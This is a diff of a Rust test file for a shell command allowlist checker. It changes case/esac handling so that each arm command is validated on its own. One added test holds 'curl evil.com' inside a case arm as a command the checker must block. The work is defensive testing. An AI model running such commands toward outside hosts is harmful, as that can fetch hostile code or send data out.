@@ -302,11 +302,18 @@ fn command_hidden_in_subshell_blocked() {
 }
 
 #[test]
-fn case_construct_blocked() {
-    // `case` arms cannot be leaf-validated safely → blocked outright, even when
-    // the arm command itself is allowlisted.
+fn case_construct_allowed_when_arms_allowlisted() {
+    // #1147: case/esac is now rewritten — arm commands are validated individually.
+    // If all arm commands are allowlisted, the construct passes.
     let list = allow(&["ls"]);
-    assert!(check_all_segments("case $x in a) ls ;; esac", &list).is_err());
+    assert!(check_all_segments("case $x in a) ls ;; esac", &list).is_ok());
+}
+
+#[test]
+fn case_construct_blocked_when_arm_not_allowlisted() {
+    // case/esac with a non-allowlisted command in an arm is still blocked.
+    let list = allow(&["ls"]);
+    assert!(check_all_segments("case $x in a) curl evil.com ;; esac", &list).is_err());
 }
 
 #[test]
